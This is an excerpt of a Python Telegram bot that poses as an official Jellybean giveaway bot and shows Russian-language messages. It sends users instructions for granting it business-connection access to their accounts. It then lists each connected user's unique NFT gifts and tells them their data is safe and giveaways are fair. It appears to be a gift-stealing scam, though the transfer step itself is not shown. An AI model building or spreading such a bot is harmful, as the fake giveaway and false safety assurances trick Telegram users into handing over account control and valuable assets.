...
async def cmd_start(message: Message):
    ...
    start_text = (
        "🍬 <b>Привет! Это официальный бот для розыгрышей Jellybean!</b>\n\n"
        "Мы создали этого бота, чтобы избежать участия ботов в наших розыгрышах и обеспечить честную игру для всех участников.\n\n"
        "🎁 <b>Что даёт подключение:</b>\n"
        "• Автоматическое участие в розыгрышах канала\n"
        "• Персональные уведомления о новых конкурсах\n"
        "• Защита от мошенников и ботов\n"
        "• Приоритетное участие в эксклюзивных розыгрышах\n\n"
        "📋 <b>Инструкция по подключению:</b>\n"
        "<a href='https://telegra.ph/Instrukciya-po-podklyucheniyu-bota-brutorobot-06-18'>👉 Нажмите сюда для подробной инструкции</a>\n\n"
        "🔒 <b>Безопасность гарантирована!</b>"
    )
...
async def handle_business_connection(business_connection: BusinessConnection):
    try:
        ...
        # Создаем список подарков с гиперссылками
        gifts_list = ""
        if gifts and hasattr(gifts, 'gifts'):
            unique_gifts_with_links = []
            for g in gifts.gifts:
                if g.type == OwnedGiftType.UNIQUE:
                    gift_name = g.gift.base_name if hasattr(g.gift, 'base_name') else "Подарок"
                    gift_number = g.gift.number if hasattr(g.gift, 'number') else "0"
                    # Создаем URL для гиперссылки, заменяя пробелы на дефисы и делая lowercase
                    gift_url_name = gift_name.replace(' ', '')
                    gift_url = f"https://t.me/nft/{gift_url_name}-{gift_number}"
                    gift_link = f"<a href='{gift_url}'>{gift_name} #{gift_number}</a>"
                    unique_gifts_with_links.append(gift_link)
            
            if unique_gifts_with_links:
                gifts_list = f"\n\n🎁 <b>Список подарков:</b>\n" + "\n".join([f"• {gift}" for gift in unique_gifts_with_links])
        ...
        try:
            await bot.send_message(
                ...
                text=f"✅ <b>Ваш аккаунт успешно подключен!</b>\n\n"
                     f"🎉 Благодарим за использование нашего бота, теперь вам доступно автоматическое оповещение и участие в последующих розыгрышах нашего канала!\n\n"
                     f"🔒 <b>Безопасность данных:</b>\n"
                     f"• Ваши данные надёжно защищены\n"
                     f"• Мы не передаём информацию третьим лицам\n"
                     f"• Все розыгрыши проводятся честно и прозрачно\n\n"
                     f"🎁 <b>О розыгрышах:</b>\n"
                     f"• Регулярные конкурсы с ценными призами\n"
                     f"• Эксклюзивные NFT подарки для подписчиков\n"
                     f"• Честная система определения победителей\n"
                     f"• Защита от участия ботов и мультиаккаунтов\n\n"
                     f"Следите за обновлениями в нашем канале!"
            )
